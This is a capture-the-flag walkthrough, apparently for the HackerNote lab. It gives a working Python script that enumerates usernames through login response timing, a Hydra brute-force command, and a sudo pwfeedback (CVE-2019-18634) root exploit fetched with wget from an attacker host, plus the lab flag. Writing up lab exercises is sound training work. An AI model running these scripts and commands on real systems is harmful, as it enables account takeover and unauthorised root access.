## 1. Exploiting the Timing Attack

Since a timing attack vulnerability exists, we can automate the discovery of valid usernames.

### Identifying the Request

Using **Firefox Developer Tools**, we can observe that the login process uses a `POST` request to `/api/user/login`

**Sample Response:**

```http
RESPONSE HTTP/1.1 200 OK
Content-Type: application/json
Date: Tue, 24 Feb 2026 15:57:57 GMT
Content-Length: 42

{"status":"Invalid Username Or Password"}
```

### Python Implementation

We can use the `requests` library to send the login data and the `time` library to measure the response delay.

```python
import requests as r
import time

# Basic timing logic
startTime = time.time()
doLogin(user)
endTime = time.time()
elapsed = endTime - startTime
```

---
## 2. Backend Vulnerability Analysis

The timing difference occurs because the backend is "poorly written." It only proceeds to the expensive password-checking phase if the username is found in the database.

### HackerNote Pseudocode

```Python
def login(username, password):
    if username in users: ## If it's a valid username
        login_status = check_password(password) ## This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```

### Why Bcrypt adds delay

When using Go's `bcrypt` library, developers set a **Work Factor** (Cost).

- **The Cost:** This determines the number of hashing rounds, calculated as $2^{\text{Cost}}$.
    
- **The Goal:** To make offline cracking and online brute-forcing painfully slow for attackers while remaining a minor delay for legitimate users.
---
## 3. Exploit Script (`exploit.py`)

This script iterates through a list of usernames. Valid usernames are identified by response times within **10%** of the largest recorded time.

```Python
import requests as r
import time
import json

URL = "http://10.114.155.220:8080/api/user/login"
USERNAME_FILE = open("names.txt", "r")
usernames = [line.strip() for line in USERNAME_FILE]

timings = dict()

def doLogin(user):
    creds = {"username": user, "password": "invalidPassword!"}
    try:
        response = r.post(URL, json=creds, timeout=5)
        if response.status_code != 200 and response.status_code != 401:
            print(f" [!] Unusual Status for {user}: {response.status_code}")
    except Exception as e:
        print(f" [!] Connection error on {user}: {e}")

print(f"\n[*] Starting Scan on {len(usernames)} usernames...")
for index, user in enumerate(usernames):
    startTime = time.time()
    doLogin(user)
    endTime = time.time()
    
    elapsed = endTime - startTime
    timings[user] = elapsed
    print(f"[{index+1}/{len(usernames)}] {user:<15} | {elapsed:.4f}s")
    time.sleep(0.01)

largestTime = max(timings.values())
for user, timing in timings.items():
    if timing >= largestTime * 0.9:
        print(f" [!] {user} is likely VALID (Time: {timing:.4f}s)")
```

> **Note:** While Python is great for custom scripts, tools like **Burp Intruder** handle timing math and threading better, though they can be slower on community versions.

---
## 4. Gaining Access (Brute Force)

Once the username `james` was identified, **Hydra** was used to find the password.

Bash

```sh
hydra -l james -P custom_passwords.txt 10.114.155.220 http-post-form "/api/user/login:username=^USER^&passowrd=^PASS^ : Invalid Username Or Password" -V
```

---
## 5. Privilege Escalation: CVE-2019-18634

Upon gaining access as `james`, we checked `sudo` permissions. A vulnerability was identified in the `pwfeedback` setting, which displays asterisks during password entry.

### Searchsploit Results

```txt
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow | linux/local/48052.sh
```

### Exploitation Steps

1. **Download Exploit:** `wget http://192.168.129.39:8000/exploit.c`
    
2. **Move to Writable Directory:** `cp exploit.c /tmp/`
    
3. **Compile:** `gcc ./exploit.c`
    
4. **Execute:** `./a.out`

### Final Root Session

```sh
james@hackernote:/tmp$ ./a.out 
[sudo] password for james: 
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(james)
# /bin/bash -i
root@hackernote:/root# cat root.txt 
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

---
